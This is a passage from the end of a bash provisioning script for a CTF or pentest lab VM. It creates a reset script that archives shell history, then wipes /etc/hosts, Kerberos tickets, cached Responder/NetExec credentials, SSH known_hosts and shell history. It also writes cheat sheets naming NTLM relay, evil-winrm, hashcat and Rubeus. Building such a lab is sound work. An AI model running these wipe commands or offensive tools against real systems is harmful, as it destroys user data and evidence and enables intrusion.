    log_info "Creating RESET_CTF_BOX.sh..."
    cat > "$USER_HOME/Desktop/RESET_CTF_BOX.sh" << 'RESET_EOF'
#!/bin/bash
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}CTFBOX RESET v3.6 — DEBIAN ZSH EDITION${NC}\n"
echo -e "${YELLOW}Captures:${NC} Zsh history + ALL live PTY buffers"
echo -e "${YELLOW}Wipes:${NC} Creds, hosts, Kerberos, SSH"
echo ""
read -p "Continue? (yes/no): " confirm
[[ "$confirm" != "yes" ]] && exit 0

ARCHIVE_DIR="$HOME/archives/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$ARCHIVE_DIR/history"

log() { echo -e "${GREEN}[+]${NC} $1"; }

# 1. CAPTURE ZSH HISTORY
log "Saving Zsh command history..."
[[ -f "$HOME/.zsh_history" ]] && cp "$HOME/.zsh_history" "$ARCHIVE_DIR/history/zsh_history.txt"
if [[ -f "$ARCHIVE_DIR/history/zsh_history.txt" ]]; then
    perl -pe 's/^: \d+:\d+;//' "$HOME/.zsh_history" > "$ARCHIVE_DIR/history/zsh_clean.txt" 2>/dev/null || true
    log "Zsh history decoded"
fi

# 2. CAPTURE ALL LIVE PTY BUFFERS
log "Dumping all active terminal screens..."
pty_count=0
for pty in /dev/pts/[0-9]*; do
    [[ ! -e "$pty" ]] && continue
    owner=$(stat -c %U "$pty" 2>/dev/null || echo "")
    [[ "$owner" != "$USER" ]] && continue
    pty_name=$(basename "$pty")
    timeout 2 script -q -c "cat" /dev/null > "$ARCHIVE_DIR/history/pty_${pty_name}.txt" 2>/dev/null || true
    ((pty_count++))
done
[[ $pty_count -gt 0 ]] && log "Captured $pty_count live terminal buffers"

# 3. ARCHIVE ENGAGEMENTS
if [[ -d "$HOME/engagements" ]] && ls -A "$HOME/engagements" &>/dev/null; then
    tar -czf "$ARCHIVE_DIR/engagements_backup.tar.gz" -C "$HOME" engagements
    rm -rf "$HOME/engagements"/*
    log "Engagements archived"
fi

# 4. SYSTEM WIPE
sudo cp /etc/hosts "$ARCHIVE_DIR/hosts.backup" 2>/dev/null
sudo bash -c "cat > /etc/hosts << 'EOF'
127.0.0.1 localhost
127.0.1.1 $(hostname)
::1 localhost ip6-localhost ip6-loopback
EOF"
log "/etc/hosts reset"

kdestroy -A 2>/dev/null || true
rm -f /tmp/krb5cc_* 2>/dev/null || true
log "Kerberos cleared"

: > "$HOME/.zsh_history" 2>/dev/null
history -c 2>/dev/null || true
log "Zsh history cleared"

rm -rf "$HOME/.responder"/* "$HOME/.nxc"/* "$HOME/.cme"/* 2>/dev/null || true
log "Cached credentials cleared"

: > "$HOME/.ssh/known_hosts" 2>/dev/null || true
log "SSH known hosts cleared"

echo -e "\n${GREEN}RESET COMPLETE${NC}"
echo -e "Archive: ${CYAN}$ARCHIVE_DIR${NC}"
echo -e "History: ${CYAN}~/archives/$(basename $ARCHIVE_DIR)/history/${NC}\n"

if [[ $pty_count -gt 0 ]]; then
    echo -e "${YELLOW}Live terminal preview (last 10 lines):${NC}"
    tail -n 10 "$ARCHIVE_DIR/history"/pty_*.txt 2>/dev/null | tail -n 10 || echo "(empty)"
    echo
fi

read -p "Reboot now? (y/n): " reboot_choice
[[ "$reboot_choice" =~ ^[Yy]$ ]] && sudo reboot
RESET_EOF
    chmod +x "$USER_HOME/Desktop/RESET_CTF_BOX.sh"
    chown "$USERNAME":"$USERNAME" "$USER_HOME/Desktop/RESET_CTF_BOX.sh"
else
    log_skip "RESET_CTF_BOX.sh already exists"
fi

# ============================================
# PHASE 9: DOCUMENTATION
# ============================================
log_progress "Phase 9: Creating Desktop Documentation"

# COMMANDS.txt
if [[ ! -f "$USER_HOME/Desktop/COMMANDS.txt" ]]; then
    cat > "$USER_HOME/Desktop/COMMANDS.txt" << 'DOC_EOF'
CTFBOX v3.6 — QUICK COMMANDS
-----------------------------------------
newengagement <n> → Create engagement
quickscan <ip> → Nmap quick
extract <file> → Universal unpack
reset → ~/Desktop/RESET_CTF_BOX.sh
update → ~/scripts/update-tools.sh

john → crack with rockyou
hashcat → GPU NTLM cracking
sqlmap → run sqlmap tool
runas → wine ~/tools/windows/runasCs.exe
win → cd ~/tools/windows
host → cd /media/sf_ctf-tools (VirtualBox shared folder)

mitm-relay → mitm6 + ntlmrelayx combo
evil → evil-winrm -i target
wl-dir → directory-list-2.3-medium.txt
DOC_EOF
    log_info "Created COMMANDS.txt"
else
    log_skip "COMMANDS.txt already exists"
fi

# TOOL_LOCATIONS.txt
if [[ ! -f "$USER_HOME/Desktop/TOOL_LOCATIONS.txt" ]]; then
    cat > "$USER_HOME/Desktop/TOOL_LOCATIONS.txt" << EOF
CTFBOX v3.6 — TOOL MAP
-----------------------------------------
USER: $USERNAME
HOME: $USER_HOME
GOPATH: $USER_HOME/go

Go Tools: $USER_HOME/go/bin/
Python: pipx + global
Ruby: evil-winrm, one_gadget
Windows: $USER_HOME/tools/windows/

VirtualBox:
  Copy-Paste: Ctrl+C/V (bidirectional)
  Drag & Drop: Enabled
  Shared Folder: /media/sf_ctf-tools → alias host

Key Files:
  ~/.zshrc
  ~/scripts/update-tools.sh
  ~/Desktop/RESET_CTF_BOX.sh
  ~/tools/windows/runasCs.exe
EOF
    log_info "Created TOOL_LOCATIONS.txt"
else
    log_skip "TOOL_LOCATIONS.txt already exists"
fi

chown "$USERNAME":"$USERNAME" "$USER_HOME/Desktop"/*.txt 2>/dev/null || true

# ============================================
# PHASE 10: FINAL CLEANUP
# ============================================
log_progress "Phase 10: Final Cleanup"
chown -R "$USERNAME":"$USERNAME" "$USER_HOME" 2>/dev/null || true
apt autoremove -y -qq 2>/dev/null || true
apt clean -qq 2>/dev/null || true

# ============================================
# COMPLETION
# ============================================
clear
echo -e "${GREEN}"
cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║                CTFBOX v3.6 — READY                            ║
║           Smart Detection + Skip Existing                     ║
╚═══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}\n"
echo -e "${YELLOW}User:${NC} ${GREEN}$USERNAME${NC}"
echo -e "${YELLOW}Home:${NC} ${GREEN}$USER_HOME${NC}"
echo -e "${CYAN}Features:${NC}"
echo -e "  • Smart installation (skips existing)"
echo -e "  • Resume capability"
echo -e "  • Better error handling"
echo -e "${CYAN}Cracking:${NC} john, hashcat"
echo -e "${CYAN}Web:${NC} sqlmap"
echo -e "${CYAN}Windows:${NC} runasCs.exe, Rubeus, SharpHound"
echo -e "${CYAN}VirtualBox:${NC} Copy-Paste + Drag & Drop + Shared Folder"
echo -e "${CYAN}Reset:${NC} ~/Desktop/RESET_CTF_BOX.sh"
echo -e "${CYAN}Update:${NC} ~/scripts/update-tools.sh"
echo ""
echo -e "${YELLOW}IMPORTANT:${NC} Reboot required to log in as ${GREEN}$USERNAME${NC}"
echo ""
read -p "Reboot now? (y/n): " reboot_choice
if [[ "$reboot_choice" =~ ^[Yy]$ ]]; then
    echo -e "\n${YELLOW}Rebooting in 5 seconds...${NC}"
    sleep 5
    reboot
else
    echo -e "\n${YELLOW}Remember to log out and log back in as ${GREEN}$USERNAME${NC} for changes to take effect!"
    echo -e "${CYAN}Or manually reboot with:${NC} sudo reboot"
fi
echo -e "${GREEN}Happy Hacking!${NC}\n"
